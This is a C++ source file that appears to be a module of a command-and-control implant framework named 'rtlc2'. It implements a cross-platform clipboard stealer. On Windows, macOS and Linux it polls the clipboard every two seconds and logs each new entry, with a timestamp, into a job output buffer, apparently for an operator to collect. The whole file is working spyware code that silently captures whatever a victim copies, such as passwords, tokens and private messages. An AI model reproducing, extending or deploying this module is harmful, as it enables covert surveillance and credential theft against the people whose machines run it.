#include <string>
#include <atomic>
#include <chrono>
#include <thread>
#include <ctime>
#include <sstream>
#include <iomanip>

#ifdef _WIN32
#include <windows.h>
#endif

#include "jobs.h"

namespace rtlc2 { namespace modules {

static std::string GetTimestamp() {
    auto now = std::chrono::system_clock::now();
    auto t = std::chrono::system_clock::to_time_t(now);
    struct tm tm_buf;
#ifdef _WIN32
    localtime_s(&tm_buf, &t);
#else
    localtime_r(&t, &tm_buf);
#endif
    std::ostringstream ss;
    ss << std::put_time(&tm_buf, "%H:%M:%S");
    return ss.str();
}

#ifdef _WIN32

static std::string GetClipboardText() {
    std::string result;
    if (!OpenClipboard(nullptr)) return result;

    HANDLE hData = GetClipboardData(CF_UNICODETEXT);
    if (hData) {
        wchar_t* pData = static_cast<wchar_t*>(GlobalLock(hData));
        if (pData) {
            int len = WideCharToMultiByte(CP_UTF8, 0, pData, -1, nullptr, 0, nullptr, nullptr);
            if (len > 0) {
                result.resize(len - 1);
                WideCharToMultiByte(CP_UTF8, 0, pData, -1, &result[0], len, nullptr, nullptr);
            }
            GlobalUnlock(hData);
        }
    }
    CloseClipboard();
    return result;
}

#elif defined(__APPLE__)

static std::string GetClipboardText() {
    FILE* pipe = popen("pbpaste 2>/dev/null", "r");
    if (!pipe) return "";
    std::string result;
    char buf[1024];
    while (fgets(buf, sizeof(buf), pipe)) {
        result += buf;
    }
    pclose(pipe);
    return result;
}

#else // Linux

static std::string GetClipboardText() {
    // Try xclip first, then xsel
    FILE* pipe = popen("xclip -selection clipboard -o 2>/dev/null || xsel --clipboard --output 2>/dev/null", "r");
    if (!pipe) return "";
    std::string result;
    char buf[1024];
    while (fgets(buf, sizeof(buf), pipe)) {
        result += buf;
    }
    pclose(pipe);
    return result;
}

#endif

void ClipboardMonitorLoop(JobInfo& job) {
    std::string lastContent;

    while (job.running.load()) {
        std::string current = GetClipboardText();

        if (!current.empty() && current != lastContent) {
            std::string entry = "[" + GetTimestamp() + "] " + current + "\n";
            job.AppendOutput(entry);
            lastContent = current;
        }

        // Poll every 2 seconds
        for (int i = 0; i < 20 && job.running.load(); ++i) {
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
    }
}

std::string GetClipboardSnapshot() {
    return GetClipboardText();
}

}} // namespace rtlc2::modules
